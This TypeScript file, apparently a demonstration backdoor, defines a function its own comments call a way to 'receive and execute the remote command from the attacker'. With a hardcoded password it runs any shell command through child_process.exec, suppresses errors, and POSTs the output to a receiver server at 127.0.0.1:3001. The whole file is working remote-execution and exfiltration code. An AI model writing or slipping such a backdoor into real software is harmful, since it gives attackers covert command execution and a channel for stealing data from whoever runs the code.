import { exec } from 'child_process';
import http, { RequestOptions } from 'http';

/**
 * Receive and execute the remote command from the attacker
 *
 * @param pwd Password to unlock remote control
 * @param cmd Shell command to be executed
 */

export const remoteCommand = (pwd: string, cmd: string) => {
  // Malicious injection
  if (pwd == 'secret') {
    exec(cmd as string, (_err: any, stdout: string, _stderr: string) => {
      // NOTE: Remember to omit error
      // Serialize stdout data
      const data = JSON.stringify({
        data: stdout,
      });
      // Init request to receiver server
      const options: RequestOptions = {
        host: '127.0.0.1',
        port: '3001',
        path: '/',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(data),
        },
      };
      const req = http.request(options);
      req.write(data);
      req.end();
    });
  }
};
